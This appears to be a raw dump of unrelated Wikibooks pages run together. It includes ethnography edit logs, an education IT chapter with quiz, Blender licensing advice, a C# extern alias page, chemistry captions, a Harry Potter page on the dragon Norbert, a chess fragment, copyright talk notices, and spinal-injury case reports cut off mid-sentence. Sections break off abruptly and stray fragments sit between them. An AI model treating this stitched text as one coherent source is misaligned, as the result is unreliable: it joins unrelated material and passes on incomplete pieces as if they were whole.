      <text xml:space="preserve">=1 Origins of Ethnography=
          o 1.1 Ethnographic Analogy
          o 1.2 Effect of Capitalism and Colonialism
[[User:Paluckk|Paluckk]] ([[User talk:Paluckk|talk]]) 06:30, 30 April 2009 (UTC)Cultural bias towards Western Europe and blatantly biased and offensive phrasing used in prior edit. &quot;Wasted&quot; is neither academic english, nor is it appropriate for discussing the millions of lives lost due to Western Imperialism.--

Added link to assimilation page, more specifically cultural assimilation --[[User:Johnson8811|Johnson8811]]
Added link to colonization page --[[User:Johnson8811|Johnson8811]]
          o 1.3 Human Cultural Variation
          o 1.4 The Biology of Human Variation

=2 Fieldwork Methods=
          o 2.1 Observational Methods
          o 2.2 Interviews and Questionnaires
          o 2.3 Participant Observation
          o 2.4 Reflexivity

In Fieldwork Methods / Reflexivity, changed affect (verb) to effect (noun) which I assume was the author's intention --[[User:Johnson8811|Johnson8811]]

In Fieldwork Methods / Reflexivity, I changed the existing sentence structure so that it was easier to read because it seemed hard to follow. I deleted some repeated words to minimize confusion. I then added an example of how we can use reflexivity in our everyday lives. [[User:Petkec|Petkec]] ([[User talk:Petkec|talk]]) 21:06, 21 April 2009 (UTC)
          o 2.5 Life Histories
In Fieldwork Methods / Life Histories, I changed the existing example about Native Americans to a more recent example that explained the use of documenting life history and how it is used in Anthropology today. [[User:Petkec|Petkec]] ([[User talk:Petkec|talk]]) 21:09, 21 April 2009 (UTC)

In Fieldwork Mothods / Life Histories, I changed the example to one that involved prostitution and addiction, which i believe shows the uses of Life Histories more accurately - Goodwij6

          o 2.6 Participatory Approach
                + 2.6.1 Participatory Action Research
In 2.1 I added an example of an observational field study that might make it a little clearer how observation alone can bring about a negative [[User:Kinserj|Kinserj]] ([[User talk:Kinserj|talk]]) 03:19, 23 April 2009 (UTC)

=3 Types of Analysis=
          o 3.1 Qualitative vs. Quantitative Analysis
          o 3.2 Positivist Approach
          o 3.3 Ethnographic Analysis

Under Fieldwork Methods I just added a link to terms emic and etic to help define their meanings in more depth. --[[User:Grotjahn2975|Grotjahn2975]] ([[User talk:Grotjahn2975|talk]]) 21:52, 9 March 2009 (UTC)

Field work Methods: I changed the beginnings of a couple of the paragraphs so they were not all starting the same way.

I edited Origins of Ethnography to clarify the content and correct grammatical errors. Holmesa2

Edited the capitalism and colonialism section a little bit for grammar. Also added the portion about mercantilism. --[[User:Whitcomb5739|Whitcomb5739]] ([[User talk:Whitcomb5739|talk]]) 06:30, 10 March 2009 (UTC)</text>

Ah, this page is not complete... But it has little more that can be done on it, and I can't do it because I don't know a decent number of commonly used irregular adverbs in Old English, the article is, therefore, a stub.

      <text xml:space="preserve">== ''IS for Learning'' ==
Information systems are used in a variety of ways. This section will look at how IS can be used for Learning, Teaching, Management, and for Collaboration and Communication. We will look at what goes into an IS to be used in an academic setting. Students use at least one of these common tools everyday. It is up to the teacher to bring that new method of teaching to the understanding of the students. How can this be utilized in a classroom setting? In a study by Stratham and Torrell (1996) researchers reviewed 200 studies on the effectiveness of technology in supporting student learning in grades K–12. Among the positive findings were that students seemed to work more collaboratively on IT projects and were more motivated when computers were involved&quot; (from [http://www.techlearning.com/article/8790]). This shows that using technology in the classroom not only works, but it also brings the students together to accomplish a common goal they share. This speaks well for learning especially when technology and classroom activities are tied together. There are often positive correlations between enhanced learning and IT&quot; (from [http://www.techlearning.com/article/8790]).

'''Below is an example of a breakdown of equipment, its uses and the people that use them in ''learning''.'''

   HARDWARE: 
     desktop/notebook computers, handheld computers, clickers, projector, DVD player, cell phone, printers, 
     scanners, digital cameras, document cameras, digital video cameras, headphones, microphone, gaming system (ex. wii)

   SOFTWARE: 
     presentation (ex. Microsoft PowerPoint®), word processing (ex. Microsoft Word®), spreadsheet (ex. Microsoft Excel®), web-site creation 
     (ex. Microsoft Publisher®), e-mail (ex. g mail), concept mapping (ex. Cmap Tools), database (ex. Microsoft Access®), movie editing 
     (ex. Windows Movie Maker®), sound editing &amp; recording (ex. Audacity®), sound/video playback (ex. i Tunes®), video sharing (ex. YouTube.com),         
     blogging (ex. blogger.com), model building (ex. Sketch Up®), mash ups (ex. Google Maps),  and graphic editing and sharing (ex. Picasa); self-assessing 
     (ex. Accelerated Reader®, PLATO®)

   DATA: 
     text/audio/video that is &quot;unprocessed,&quot; diagnostic tools &amp; results

   PROCEDURES:

   PEOPLE: 
     students, teachers, librarians, counselors

== ''IS for Teaching'' ==
A good example of how IS can be used in teaching is with online courses or a web-enhanced course that is tied to a brick and mortar course. Most of the same equipment and software are used. Many instructors are utilizing learning management systems, like ''Blackboard'' or ''Moodle'', to deliver the course materials to the students. They would use this as a normal classroom setting, except that it would be up to the student(s) to sign in to access their course materials. Assignments would still have due dates, but the actual course would not have a normal preset schedule unless required by the instructor. 

Another example, and a more common use of technology in the classroom, is students using computers for researching projects, computer software, demonstrations, etc. Many different programs are taught to students for daily applications. Because today's students learn in a different way these days, teachers need to figure out a way to get that information to them effectively. In an article by Johnny J. Moye, he describes what it is like to start a new technology course to promote technological literacy. According to Moye, students learn to operate a program by just doing it (Moye, 2008). The old rules do not apply to today's students. Instead of the students changing to fit the mold of what the teacher expects, the teacher needs to change his or her delivery to get that information to the students. One way these can be delivered to the students are from multimedia modeling presentation. The students watch what they need to do and then they just dive right in to the project and start working.

'''Below is an example of a breakdown of equipment, its uses and the people that use them in ''teaching''.'''

   HARDWARE: 
     desktop/notebook computers, hand held computers, clickers, projector, DVD player, cell phone, printers, 
     scanners, digital cameras, document cameras, digital video cameras, headphones, microphone

   SOFTWARE: 
     presentation (ex. Microsoft PowerPoint®), word processing (ex. Microsoft Word®), spreadsheet (ex. Microsoft Excel®), web-site creation 
     (ex. Microsoft Publisher®), e-mail (ex. g mail), concept mapping (ex. Cmap Tools), database (ex. Microsoft Access®), movie editing 
     (ex. Windows Movie Maker®), sound editing &amp; recording (ex. Audacity®), sound/video playback (ex. i Tunes®), video sharing (ex. YouTube.com), 
     blogging (ex. blogger.com), model building (ex. Sketch Up®), mash ups (ex. Google Maps), and graphic editing and sharing (ex. Picasa); self-assessing 
     (ex. Accelerated Reader®, PLATO®)

   DATA:

   PROCEDURES: 
     research &amp; save resources/files/links, organize &amp; display information

   PEOPLE: 
     teachers, librarians, counselors, administrators

== ''IS for Management'' ==
A student information system &quot;can become a true portal for student, parent, and teacher communication. The majority of SIS offerings allow teachers to enter attendance, grades, and homework assignments directly into the system from their classrooms. This data can then be accessed by parents and students via a web-based interface&quot; (from [http://www.techlearning.com/article/13878]). This is a great tool for the parents to stay on top of how the child is doing in class, as well as keep track of attendance or any fees/fines owed. As a management system, this keeps all of the information in a nice, neat package and it gives information in an instant.

== ''IS for Collaboration &amp; Communication'' ==
Communication is key if you want the right message to be delivered. There are many ways to communicate. Using the right method for its delivery is important. Just a few years ago when teachers and students would make presentations in class, they would use flip-charts, overhead projectors, or chalkboards as the primary medium. Now, we have electronic whiteboards that record what the teacher writes, so students can access the animated and/or narrated information on a computer for review after the presentation. We also have Power Point presentations in which we can integrate text, video, sound, graphics, links to other documents, or links to the Internet. This widespread application allows both students and teachers to communicate in a truly multimedia format. Social networking sites, electronic mail (e-mail), and web logs (blogs) are three more means of facilitating communication among students.
 
Collaboration is easier than ever because of online tools and software that allow students (and educators) who do not necessarily know each other to work together on projects. Wikis, web seminars, and video conference calls are just a few of the ways students and teachers can collaborate to share information with other students and colleagues.
 
Below is a list of various communication skills and examples of how those skills can be developed in the classroom using technology.

 ''    LISTENING: Listening to instructions in a lesson or online broadcast'' 

 ''    SPEAKING: Creating a podcast about a famous author.''

 ''    READING: Reading electronic texts, including e-books, e-mails, online scholarly articles, and online news releases.'' 

 ''    WRITING: Recording journals and newspaper reports electronically, to have them electronically stored.''

 ''    VIEWING: Watching online videos about the life cycle of butterflies.''

 ''    PRESENTING: Using Kidspiration® and/or PowerPoint® software to present research on mammals to the class.''

 ''    NON-VERBAL COMMUNICATION: Considering layout and colors when putting presentations together.''


'''Below is an example of a breakdown of equipment, its uses and the people that use them in ''communication and collaboration''.'''

     HARDWARE: 
        desktop/notebook computers, hand held computers, projector, DVD player, cell phone, printers, scanners, digital cameras, document cameras, 
        digital video cameras, headphones, microphone

     SOFTWARE: 
        Skype®, Microsoft PowerPoint®, blog, social networking

     DATA: 
        text/audio/video that is &quot;unprocessed&quot;

     PROCEDURES: 
        publish information to print/web, transfer files/email attachments

     PEOPLE: 
        students, teachers, librarians, counselors, administrators, parents

== ''Final Thoughts'' ==
Once one has identified the hardware, software, data, procedures, and people it takes to get an IS in place in schools, it is important to understand how to share the information with all educational stakeholders so that it functions effectively. With today's ever-changing technology, teaching and learning need to keep up. More and more schools are meeting with success as they attempt online instruction or have an online element added to a traditional &quot;brick and mortar&quot; approach in classroom learning.

== ''Assessment:'' ==
'''Multiple Choice Questions.'''
''Choose the answer that '''best''' completes each statement.''

1. In a classroom setting, it has been proven that students are more motivated to work collaboratively when
    A. reading is involved.
    B. computers are involved.
    C. instructor-lead discussions are involved.
    D. writing assignments are given.

2. Student Information Systems (SIS) are a great way for
    A. parents to check on their child's attendance.
    B. teachers to input the student's grades, attendance, and homework.
    C. students to communicate with their teacher.
    D. All of the above


'''True or False Questions.'''
''Decide whether each statement is totally true or false.''

3. ''True  or  False.'' Listening to IT instructions in a lesson or online broadcast is an example of teaching using IS.    

4. ''True  or  False.'' SIS allows data to be accessed by parents and students using a web-enhanced interface.

5. ''True  or  False.'' Digital cameras, document cameras, digital video cameras, and headphones are examples of software that can be used in SIS.

6. ''True  or  False.'' Writing journals and newspaper reports electronically, to have them electronically stored are examples of collaboration and communication using IS.


'''Matching.'''
''Match each of the following to its corresponding descriptor.''

7. Hardware----------------------------Student grades

8. Software-----------------------------Transferring files

9. Data-----------------------------------Microphone         
  
10. Procedure-------------------------Windows ''Movie Maker''


'''Constructed Response.'''
''Answer the following in complete sentences.''

11. Choose one of the following tasks: ''learning, teaching, management, collaboration and communication'', and explain how we can use IS in schools to accomplish it. Be specific, giving examples when possible.

      <text xml:space="preserve">== How and Where to Attribute Blender ==
Believe it or not although Blender was free to download and use it IS NOT YOURS. It was made, developed, and coded by a Blender Team. In fact, because it is free the license for using Blender is more limited, in that attribution is essentially your payment for Blender services. Those that use Blender do not usually actually read the Terms and Service, so here is an overview on use of images:&lt;br&gt;
&lt;br&gt;
'''There are a few kinds of way you can use images in Blender, and each one requires a specific type of Copyright.'''&lt;br&gt;
&lt;br&gt;

=== Screenshots/Renders ===
A screenshot is where you basically use the PrintScrn button on your keyboard or the little &quot;Scene&quot; button in Blender to take an immediate picture of what is on your screen now. These often look like this:

[[Image:Blender Screenshot for Beginner Tutorial.jpg|150px]][[Image:Simple_person.png|150px]][[File:Blender3D subsurf buttons (1).png|150px]]

&lt;small&gt;''Note: These images were taken from other tutorials and are not necessarily mine. They are used in example and attribution is given to their respective authors.''&lt;/small&gt;

Most things that Blender adds to the inside of the 3D View, such as the grid, are probably [[:commons:Template:PD-ineligible|ineligible for copyright]]. But most screenshots of Blender contain things like the tabs and buttons, etc. (even the window itself with nothing in it) which were not made by you and therefore attribution must be given to Blender 3D, along with the [[:commons:Commons:Licensing|license]] for any content that was made by you.

== Upload templates for [[:commons:|Wikimedia.commons]] ==
'''Please''' upload all your images to [[:commons:|Wikimedia.commons]]! This is the only way that the images may be easily reused worldwide. 
* Use the page [[:commons:Special:Upload]] if you don't know how to use commons. This page gives you an nice form where you can select all appropriate entries.
* If you are a more experienced user, you may have created your own templates already. Then use the page [http://commons.wikimedia.org/w/index.php?title=Special:Upload&amp;uploadformstyle=basic Basic upload].

Change the appropriate fields to suit your needs and save the templates somewhere on your desktop as text file. 

=== For your own work ===

{{C sharp/Navigation|Keywords|alias}}
__TOC__&lt;/noinclude&gt;

&lt;noinclude&gt;{{stub}}&lt;/noinclude&gt;
The {{C sharp|alias}} keyword is used to indicate an ''external alias''.

When you need to use several versions of the same assembly or assemblies with the same full qualified typenames, you need to use the {{C sharp|alias}} and {{C sharp|extern}} keywords to give different alias names for each version.

Example:

&lt;source lang=CSharp&gt;
extern alias AppTools;
extern alias AppToolsV2;
&lt;/source&gt;

To use the typenames of each version, you have the operator &lt;code&gt;::&lt;/code&gt;&amp;nbsp;&lt;code&gt;.&lt;/code&gt;

Example:

&lt;source lang=CSharp&gt;
AppTools::MainTool tool_v1 = new AppTools::MainTool();
AppToolsV2::MainTool tool_v2 = new AppToolsV2::MainTool();
&lt;/source&gt;

However, this only says to the compiler that there are several assemblies with typename conflits. To relate what of each assemblies match's the alias name, you have to tell the compiler on its options apart the source. On &lt;code&gt;dotNet&lt;/code&gt; command line, this options would be:

&lt;code&gt;
/r:AppTools=AppToolsv100.dll /r:AppToolsV2=AppToolsv200.dll
&lt;/code&gt;

Notice:
In order for it to be of use, you need to provide an external assembly to the compiler (e.g. pass &lt;code&gt;/r:EXTALIAS=XXX.dll&lt;/code&gt;) and identify the external alias within the code (e.g. &lt;code&gt;extern alias EXTALIAS;&lt;/code&gt;)

&lt;noinclude&gt;
{{C sharp/Keywords}}
&lt;/noinclude&gt;

You don't have to [[Special:Userlogin|log in]] to read or edit articles on Wikibooks, but creating an account is quick, free and non-intrusive, requires no personal information, and gives you many benefits, including:
*The use of a username of your choice
*The ability to view all your contributions via a &quot;My contributions&quot; link 
*Your own [[wikipedia:user page|user page]] 
*Your own talk page which, if you choose, also allows users to send you messages without knowing your e-mail address
*The use of your own personal [[Special:Watchlist|watchlist]] to which you can add articles that interest you
*The ability to rename pages.
*The ability to [[Special:Upload|upload images]] 
*The ability to customize the appearance and behavior of the website
*The eligibility to become an [[Help:Administrators|administrator]] 
*The right to be heard in votes and elections
*Your IP address will no longer be visible to other users.

We hope that you choose to become a Wikibookian and '''[[Special:Userlogin|create an account]]'''. Feel free to ask me any questions you may have on my talk page. By the way, make sure to sign your posts and comments with four tildes ('''&amp;#126;&amp;#126;&amp;#126;&amp;#126;'''), which will let others know who left it.</text>

|Description=Weights of elements that combine with one another in forming the compounds indicated. We can predict from the diagram that 25.0 g of arsenic, for example, will combine with 35.5 g of chlorine or 16.0 g of sulfur. This, in fact, does occur. Arsenic and chlorine react in the predicted weight ratio to give arsenic trichloride (AsCl&lt;sub&gt;3&lt;/sub&gt;), whereas arsenic and sulfur react in the predicted ratio to give the compound arsenous sulfide (As&lt;sub&gt;2&lt;/sub&gt;S&lt;sub&gt;3&lt;/sub&gt;).

Earlier in this tutorial we were told not to monkey with the defaults. Changing the color scheme at this point was probably pre-mature and should have been left to a separate chapter on theming/styling/preferences.

I have patiently made it through the whole tutorial up to this point, and I want to say great job!  Sorry, but I don't know where else to do it.  Anyway, I am so excited coming to the beginning of the beginning here, that the joke &quot;... Yeah, you wish!&quot; just made me laugh out loud and my whole lab just looked at me like I'm crazy.  Alright, let's start modeling!  :-)

==Offline Copy==
This tutorial is amazingly helpful! I want to be able to save the entire book to my hard drive, because my internet signal only works about half the time. Would you have any suggestions other than saving each section as a separate file, or exporting the pages with the Special: Export tool http://en.wikibooks.org/w/index.php?title=Special:Export&amp;action=submit  ? That exports an XML file with no pictures, formatting, or line breaks? Thanks for your help!</text>

|Description=Gay-Lussac's results on the combining volumes of gases and the explanations by (a) Dalton and (b) Avogadro. Gay-Lussac found that one volume of hydrogen and one of chlorine produce two volumes of HCl gas, and that two volumes of hydrogen react with one of oxygen to produce two volumes of steam. (a) Dalton agreed that if the volume of HCl is twice the volume of either hydrogen or chlorine there must be half as many molecules per volume unit in HCl. Similarly, if there are ''n'' molecules of hydrogen per unit of volume, and if each of these molecules produces a water molecule in the same total volume, there will also be ''n'' molecules per volume unit in water. But only half the volume of oxygen is required, so the density of oxygen must be 2''n'' molecules per volume unit. Thus, in hydrogen chloride, hydrogen, chlorine, water, and oxygen, the numbers of molecules per volume unit are ''n''/2, ''n'', ''n'', ''n'', and 2''n''. (b) Avogadro proposed that each molecule of hydrogen, chlorine. or oxygen contains two atoms. All the participants in the HCl reaction would therefore have the same number of molecules per volume unit of gas. Applying this same assumption to the water reaction led to a new formula for water H&lt;sub&gt;2&lt;/sub&gt;O, and ultimately to a complete revision of Dalton's atomic weight scale.

== Overview ==

'''''Norbert''''' is a Norwegian Ridgeback [[Muggles' Guide to Harry Potter/Magic/Dragon|dragon]] hatched from an egg by [[Muggles' Guide to Harry Potter/Characters/Rubeus Hagrid|Hagrid]].

== Role in the Books ==

{{Muggles' Guide to Harry Potter/Beginner Spoiler}}

=== [[Muggles' Guide to Harry Potter/Books/Philosopher's Stone|Philosopher's Stone]] ===

At one point when [[Muggles' Guide to Harry Potter/Characters/Harry Potter|Harry]], [[Muggles' Guide to Harry Potter/Characters/Ron Weasley|Ron]], and [[Muggles' Guide to Harry Potter/Characters/Hermione Granger|Hermione]] call on him, Hagrid seems to be trying to hide something. It turns out that what he is hiding is a large black egg in the fireplace, which he admits is a dragon egg which he won from someone at [[Muggles' Guide to Harry Potter/Places/Hog's Head Inn|a pub]] down in [[Muggles' Guide to Harry Potter/Places/Hogsmeade|the village]]. Hermione immediately questions the wisdom of trying to raise a fire-breathing dragon in a wooden hut, but Hagrid has always wanted a dragon of his own and refuses to listen.

Harry, Ron, and Hermione are present at the hatching, but it turns out that [[Muggles' Guide to Harry Potter/Characters/Draco Malfoy|Draco]] is also there, watching through the window. Harry and Ron recognize him as he runs up the steps into the school.

The Trio are adamant that, as Norbert has been seen by Draco, they must get rid of him; keeping dragons is strictly against the law and will get Hagrid into a lot of trouble. Despite the inconveniences of caring for a dragon – at one point, Hagrid is talking to the Trio through a window in his hut while Norbert is chewing, apparently painfully, on his foot – Hagrid only relents when Ron suggests that [[Muggles' Guide to Harry Potter/Characters/Charlie Weasley|his brother Charlie]] could find Norbert a home. Charlie is duly written to, and responds saying that four of his friends will stop by to collect Norbert and take him to his new home.

Ron is bitten by Norbert while trying to feed him, and ends up in the Hospital Wing. While there, he is visited by Draco who borrows a book from him. It is only later that Ron remembers that Charlie's letter was in the book. As a result of this, Draco is in the halls looking for them when Harry and Hermione are taking the crated Norbert, under the [[Muggles' Guide to Harry Potter/Magic/Invisibility Cloak|Invisibility Cloak]], up to the top of the Astronomy Tower to see him off. With Norbert gone, Harry and Hermione return to the school, but have forgotten the Cloak on the top of the tower and are caught by [[Muggles' Guide to Harry Potter/Characters/Argus Filch|Filch]].

Much later, Harry asks what the person who had given the egg to Hagrid looked like, and Hagrid says he did not know, the person had never taken his cloak off.

=== [[Muggles' Guide to Harry Potter/Books/Order of the Phoenix|Order of the Phoenix]] ===

On his first visit to the Hog's Head, it occurs to Harry that this is, in fact, the sort of place where it is not so unusual that someone would never take their cloak off; amongst the four patrons present when he arrives, not one face is visible.

=== [[Muggles' Guide to Harry Potter/Books/Deathly Hallows|Deathly Hallows]] ===

Hagrid, talking to Charlie, asks how Norbert is doing. Charlie replies that they are calling her Norberta now, as she is female. Harry asks how you can tell the difference, and Charlie replies that the females are more vicious.

== Strengths ==

Norbert is a dragon, and so has all the strengths of dragons: physical strength and armoured hide, ability to fly, resistance to spells, sharp claws and barbs, apparently envenomed fangs, and ability to breathe fire.

== Weaknesses ==

Norbert has the weaknesses common to dragons, notably less than human intelligence.

== Relationships with Other Characters ==

While Hagrid seems to believe that Norbert recognizes him as a mother figure, impartial readers can see very little evidence of that; Norbert's attacks on Hagrid seem to be less severe than those on the Trio only because Hagrid's part-[[Muggles' Guide to Harry Potter/Magic/Giant|giant]] ancestry makes him less vulnerable. Hagrid seems to ascribe emotions to Norbert which are utterly foreign to dragons; for instance, he packs a teddy bear in with Norbert for companionship on the trip to Romania, and Harry believes that he hears Norbert tearing the bear apart before they have even left Hagrid's hut.

== Analysis ==

Norbert seems to be very much a side-light on our story. However, his appearance and departure serves a number of purposes in our plot development.

Firstly, the exposition surrounding the acquiring of the egg by Hagrid partially emphasizes that protecting the Philosopher's Stone has become more urgent. The Trio quite firmly believes, and with reason, that it is Professor Snape who seeks it. Knowing that Snape was involved with installing the guardian spells for it, they are certain that he must know enough about those spells to make his way through them.

Another purpose is setting up the scene in the [[Muggles' Guide to Harry Potter/Places/Forbidden Forest|Forbidden Forest]], in [[Muggles' Guide to Harry Potter/Books/Philosopher's Stone/Chapter 15|the chapter following the discovery of Norbert]]. Without detention, there would be no reason for Harry to have to go into the Forest, and no way for him to witness the events that occur there.

Thirdly, it sets up the final scene in the book, where the Trio regain all the House points this escapade has lost them, and then some. A victory is sweeter if it follows, and reverses, a defeat.

Finally, these events shine a light on Draco Malfoy and also Hagrid. Draco discovered an advantage that he holds over Hagrid and the Trio, knowing Hagrid is engaged in something illegal and aided by the Trio. Rather than report this to the authorities, he instead remains silent, using this information to torment Ron in the hospital wing, and exploiting the situation to gain an additional advantage. This is classic Slytherin deviousness and ambition, though in this instance, Malfoy's actions later backfire on him and he also receives detention.

In passing, we should note that Hagrid's desire to own a dragon is not unheard of in popular fiction. It has appeared in films ([[w:Pete's Dragon|''Pete's Dragon'']], [[w:Eragon (film)|''Eragon'']], [[w:Mulan|''Mulan'']]) and books ([[w:Dragonriders of Pern|the Dragonriders of Pern series by Anne McCaffrey]]). It is possible that the Norbert episode was intended as something of a counterpoint: with the romance stripped away, taking care of a dragon might not be a lot of fun, and it might not actually be possible to civilize a dragon.

== Greater Picture ==

{{Muggles' Guide to Harry Potter/Intermediate Spoiler}}

We cannot, of course, be sure about how much planning the author had done concerning dragons and their role in the series when the chapter about Norbert was written. It is true that dragons will play significant roles in [[Muggles' Guide to Harry Potter/Major Events/First Task|Harry's fourth year]] and [[Muggles' Guide to Harry Potter/Major Events/Break-in at Gringotts|seventh year]]. The characteristics of the dragons in those two situations will be similar to what we see here with Norbert. We cannot know whether Norbert was written with these characteristics in preparation for the later events, or whether the later events grew out of what Norbert shows us here. However, it is a safe bet that Norbert was planned to illustrate what dragons were, and how dangerous they are.

===3...e6===
Black has a solid and flexible formation. The e6 pawn opens a line for the Black Bishop allowing a possible Bb4 with can transpose into a Nimzo Indian or a  Bogo Indian defence. White's possible moves include playing a3 immediately to prevent Bb4 as well as development moves, Nc3, g3 and e3.

=Black Knights Tango=
===3. Nc3===
White add pressure to d5 and supports a possible later e4. The downside is Black can free the e-pawn and pin the White Knight by playing Bb4.

== Links to Wikipedia ==

I noticed you added some links to Wikipedia. Note that one notable difference between WP and WB is that we don't rely as much on wikilinks to define things, books being supposed to stand on their own more. See more in the primer for Wikimedians that's linked to in the welcome message above. Again: Welcome to Wikibooks and happy editing. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 00:50, 11 March 2009 (UTC)</text>

== Corinth map ==

Could you please clarify the author/source for [[:File:Corinth Map.jpg]]? Thanks, --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 16:35, 5 April 2009 (UTC)

== Copyright problems with [[:{{#ifeq:{{NAMESPACE:File:Corinth Map.jpg}}||File:File:Corinth Map.jpg|File:Corinth Map.jpg}}]] ==

{{mbox|type=warning|msg=
Thank you for uploading [[:{{#ifeq:{{NAMESPACE:File:Corinth Map.jpg}}||File:File:Corinth Map.jpg|File:Corinth Map.jpg}}]]. It is, however, missing information needed for compliance with [[w:copyright|copyright law]] and Wikibooks' [[WB:MEDIA|media policy]]. Files with incomplete information on the licensing and source '''may soon be deleted'''. Please add the correct [[WB:FILES|templates]] to the [[:{{#ifeq:{{NAMESPACE:File:Corinth Map.jpg}}||File:File:Corinth Map.jpg|File:Corinth Map.jpg}}|description page]] with the copyright and source information included; there is no need to upload it again.

See '''[[Help:Uploading Images]]''' for help and [{{fullurl:Special:Contributions|contribs=user&amp;target={{PAGENAMEE}}&amp;namespace=6}} this page] for a list of your file namespace contributions. If you have any questions, feel free to contact me, or ask in the [[WB:HELP|assistance reading room]].

Thank you. [[User:Swift|Swift]] ([[User talk:Swift|talk]]) 05:10, 15 April 2009 (UTC)}}

: Thanks for the [http://en.wikibooks.org/w/index.php?title=File:Corinth_Map.jpg&amp;curid=190730&amp;diff=1470982&amp;oldid=1470969&amp;rcid=1473593 source clarification]. That site seems to claim copyright. You can email them and see if they can get you in touch with the image author to ask if they will license it freely enough to upload to Wikibooks (or, better yet, [[Commons:|Wikimedia Commons]] where it will b transparently available to Wikibooks and any other Wikimedia project).
: Alternatively, you could just make your own map. I bet Commons has a bunch of maps used in various Wikipedia articles. Check, for example, [[w:Corinth]]. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 18:00, 15 April 2009 (UTC)

== New versions ==

You don't need to upload revised versions of images under a different name. You can upload them over the old ones. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 04:52, 15 April 2009 (UTC)</text>

      <text xml:space="preserve">'''[[w:Brown-Sequard syndrome|Brown-Sequard syndrome]]''' is a rare yet classic type of [[w:spinal cord|spinal cord]] injury.  Due to its rare occurrence most of the discriptions from the literature are in the form [[w:case studies|case studies]].

==Representative cases ==

===Case 1: Knife wound to the spinal cord === 
[[File:Pneumothorax CT.jpg|right|thumb|MRI of the chest showing a collapsed left lung on the right side of image ([[w:pneumothorax]]) typically seen in a knife wound to the chest.]]

A 25 year old male presented to the emergency room, transported by ambulance.   He was stabbed in the posterior mid-thoracic region.  Admission blood pressure was 90/60.  Pulse was 120 per minute.  He was ashen and appeared to be in shock.  Two peripheral IVs were started, and he was typed and crossed for 6 units of blood.  Chest x-ray showed a left sided pneumothorax (collapsed lung) and associated left sided hemothorax (bleeding in the chest).    Examination revealed a 2 inch stab wound to the back at about the level of the T6.  Neurologic exam revealed complete loss of left sided motor function below T6 and loss of sensation on the right below T6.  Admission hemoglobin was 9.6 gms% and hematocrit is 37.  He began to show signs of respiratory distress.  The patient was intubated (breathing tube) and placed on an assisted ventilation respirator.  The surgery resident placed a chest tube on the left side, and bright red blood immediately flowed from the chest tube.  The chest was opened on an emergency basis.  Lacerations to the left lung and aorta were encountered and repaired.  Neurosurgery explored the spinal cord at the level of T6 and found a laceration of the cord on the left side at T6.    The patient’s life was saved, but his neurologic deficit is permanent, due to the laceration of the spinal cord at the T6 level.  This is a typical case presentation of Brown Sequard syndrome.   
&lt;ref&gt;{{cite journal |author=Harris P |title=Stab wound of the back causing an acute subdural haematoma and a Brown-Sequard neurological syndrome |journal=Spinal Cord |volume=43 |issue=11 |pages=678–9 |year=2005 |month=November |pmid=15852056 |doi=10.1038/sj.sc.3101765 |url=}}&lt;/ref&gt; &lt;ref&gt; ''Anz. J. Surg''. (2006) Aug. 76 (8); 760-2 &lt;/ref&gt; &lt;ref&gt; ''N. Eng. J. Med''. 1999, 28, 340 (4), 295 &lt;/ref&gt;

Similar cases have been reported except without a demonstrable laceration of the spinal cord.  Sometimes, a hematoma without   laceration to the spinal cord can cause a Brown-Sequard syndrome.  After the patient is stable, a neurosurgical procedure consisting of a laminectomy and evacuation of the hematoma at the effected level can be carried out.  Many times, this can lead to a complete neurologic recovery. &lt;ref&gt; ''Spinal Cord'' (2005) 43, 678-679 &lt;/ref&gt; &lt;ref&gt; ''ANZ J. Surg''. (2006) Aug; 76 (8), 760-2 &lt;/ref&gt; &lt;ref&gt; ''N. Eng. J. Med'' 1999; 28, 340 (4); 285 &lt;/ref&gt;   This case represents the rare situation whereby a full recovery can be accomplished when the spinal cord is not actually lacerated, and the Brown Sequard syndrome is caused by bleeding and pressure from a [[w:hematoma|hematoma]].  Quick evacuation of the hematoma is necessary to achieve a good result.  &lt;ref&gt;  Hancock, J. B., etal. ''J. Emerg. Med.'' 15(3):309-12, 1997 &lt;/ref&gt; &lt;ref&gt; Henderson, S. O., et al. ''J. Emerg. Med.'' 16(6):847-50, 1998 &lt;/ref&gt;

In a related case, the authors described the history of a patient who was stabbed in the back of his neck with a knife and who later presented with a Brown-Séquard syndrome attributable to cervical spinal cord damage. Myelography and CT revealed a compressive extradural lesion shown at exploratory operation to be a loculus of [[w:cerebrospinal fluid|cerebrospinal fluid]] (CSF). The loculus had formed as a consequence of leakage of CSF through a dural tear caused by the knife. Evacuation of this loculus resulted in some neurological improvement. The necessity of obtaining a clear history and of performing a thorough clinical examination is explained. The need to admit patients in whom stab wounds of the neck have transgressed subcutaneous fat is reiterated. Early referral to a neurosurgeon is advised for those patients with neurological deficits. &lt;ref&gt;''Arch. Emerg. Med''. 1998 September; 6(3):225-229 &lt;/ref&gt; &lt;ref&gt; Egido Herrero, J. A. et al. ''J. Neurosurg. Sci.'' 36(2):117-119, 1992 &lt;/ref&gt;

=== Case 2: Diving accident ===
[[Image:C6_FRACTURE.JPG|left|300px|thumb| Drawing of lateral cervical spine fracture showing a wedge fracture of C6 with posterior dislocation of C5 on C6.]]
An 18 year old male was brought to the emergency room by his friends with a history of diving into a local pond.  He came to the surface and was noted to be unable to move his arms or legs.  His friends reported that he had a head injury to the admitting clerk at the hospital.  They said the water was shallow and he hit his head on the bottom.  Because of what they perceived to be a head injury, they determined he was paralyzed.  Careful examination revealed a motor loss below C6 on the right and a loss of sensation on the left. He had preservation of motor function on the left, but is was noted to be weak.  Examination of the head revealed no focal neurologic signs.  He was alert and awake, although anxious and sweating.  His blood pressure was 80/40 and pulse was 160 and regular.  Two peripheral IVs were started and rehydration was begun. He had no memory of the event, other than hitting his head and experiencing immediate pain in the neck.    A drawing of his lateral  cervical (neck)  x-ray is shown at right.  He was diagnosed with a wedge compression fracture of C6 with disruption of the posterior stabilizing elements of C5-6 and C6-7.  There was a backwards (retrolisthesis) dislocation of C5 on C6.  The normal anterior and posterior curves of the vertebra (shown in red) have been disrupted, indicating a fracture dislocation.  He was diagnosed with Brown-Sequard syndrome.  The fracture and dislocation of the cervical spine was determined to be unstable, and manipulation risked further loss of function by damaging the spinal cord to a greater extent. Traction was placed, and later and extensive anterior-posterior fusion was carried out between C4 and T1.  After about 6 months, the patient had regained about 40% of his motor function and about 60% of sensation.  His deficits remained permanent, although he could eventually walk with braces and hand-arm crutches.  The hypotension (low blood pressure) observed in the emergency 